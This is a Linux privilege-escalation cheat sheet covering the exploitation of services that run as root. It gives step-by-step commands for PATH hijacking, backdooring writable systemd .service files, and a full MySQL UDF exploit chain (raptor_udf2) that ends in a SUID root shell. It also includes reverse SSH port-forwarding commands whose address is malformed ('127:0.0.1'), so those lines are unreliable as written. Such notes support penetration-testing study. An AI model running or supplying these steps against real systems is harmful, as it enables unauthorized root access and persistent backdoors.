# Service Exploitation

Show all processes running as root:
```bash
ps aux | grep "^root"
```

With any results, try identifying the version number of the program being executed. And then just search for exploits.

Running the program with the --version or -v command line option often shows the version number:
```bash
$ <program> --version
$ <program> -v
```
On debian-like distributions, dpkg can show installed programs and their versions:
```bash
$ dpkg -l | grep <program>
```

On systems that use rpm, the following achieves the same:

```bash
$ rpm -qa | grep <program>
```

Like with scheduled tasks / cron jobs, **Pspy** can be useful to see what runs on a machine over time.

Enum commands:

```bash
ps aux
ps -ef
top
cat /etc/services

dpkg -l #Debian
rpm -qa #Centos
```

### Relative Path Exploits

Check the path used by systemctl
```bash
systemctl show-environment
```

If you can write to one of the locations on the path, then you might be able to elevate privileges. 

For that you will have to find a service that does not supply the path to a called binary. 

For example it would say something like
```bash
ExecStart=somebinary
```
instead of 
```bash
ExecStart=/usr/bin/somebinary
```
Then you can create that binary and hopefully it takes precedent over the real intended binary.

### Insecure File Permissionss

Check if you can write any .service file, if you can, you could modify it so it executes your backdoor when the service is started, restarted or stopped (maybe you will need to wait until the machine is rebooted).

For example create your backdoor inside the .service file with `ExecStart=/tmp/script.sh`


## Example: MySQL

In this scenario we figured out the following via enumeration:

* The mysqld process runs as root
* We can connect to MySQL as root user. Either because we do not have to supply a password. Or because we know the mysql root user password from enumeration.

lse.sh should point these out.

Let's figure out the version of mysqld:

```bash
$ mysqld --version
mysqld  Ver 5.1.73-1+deb6u1 for debian-linux-gnu on x86_64 ((Debian))
```
```bash
searchsploit linux mysql 5.
```

There is a PrivEsc path for this version of MySQL, involving user defined functions (UDF).

* MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
* Exploit: https://www.exploit-db.com/exploits/1518

Compile the exploit:
```bash
gcc -g -c raptor_udf2.c
```

For x64:
```bash
gcc -g -c raptor_udf2.c -fPIC
```

Create a shared object from the exploit binary:
```bash
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Create the plugin/function and use it to make suid copy of bash:

```bash
$ mysql -u root -p
Enter password:
[...]
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/exploit/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
mysql> select do_system('cp /bin/bash /tmp/rootshell; chmod +s /tmp/rootshell');

```

Depending on the version of MySQL you will have to change plugin directory. Here in version 5 it is `/usr/lib/mysql/plugin/`.

In the original exploit description they just write to `/usr/lib/` (presumably for version 4). Do some googling.


To gain a root shell just execute the copied bash binary:

```bash
$ /tmp/rootshell -p
rootshell-4.1# whoami
root
```

-p flag to keep the SUID, bash would otherwise automatically drop it.


## Port Forwarding

See [dedicated SSH spreadsheet](../../ssh.md)

---

If you cannot run/compile an exploit from the target machine, then just use port forwarding so you can exploit it from your kali machine.

```bash
ssh -R <local-port>:127:0.0.1:<service-port> <username>@<local-machine>
```

For the MySQL example this would be:
```bash
ssh -R 4444:127:0.0.1:3306 kali@<our_own_ip>
```

...which would open the port 4444 on our kali machine and allow us to access the MySQl server on the target through this local port.

```bash
mysql -P 4444 -u root -p
```